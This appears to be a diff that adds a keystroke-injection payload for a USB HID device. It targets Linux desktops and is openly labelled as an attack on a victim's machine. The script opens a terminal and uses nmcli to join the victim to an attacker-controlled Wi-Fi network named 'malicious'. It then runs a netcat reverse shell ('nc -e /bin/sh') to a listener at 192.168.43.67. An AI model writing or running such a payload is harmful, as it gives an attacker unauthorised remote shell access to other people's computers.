@@ -1,0 +1,20 @@
+ARDUINO_OUTPUT
+REM opening terminal using win + enter in i3wm
+DELAY 1000
+ALT F2
+DELAY 700
+STRING xterm
+DELAY 500
+ENTER
+DELAY 1000
+REM using network manager (mostly installed on all linux) to start networking without being super user 
+STRING nmcli networking on
+ENTER
+DELAY 500
+REM connecting to wireless network created by malicious user.
+STRING nmcli device wifi connect malicious ifname wlan0 password malicious name malicious
+ENTER 
+DELAY 1000
+REM launching reverse shell on victim's machine (note :- a server should be listening on the attcker machine prior to launching attack ) and nc should be present normally it is present on most linux
+STRING nc -e /bin/sh 192.168.43.67 8888
+ENTER
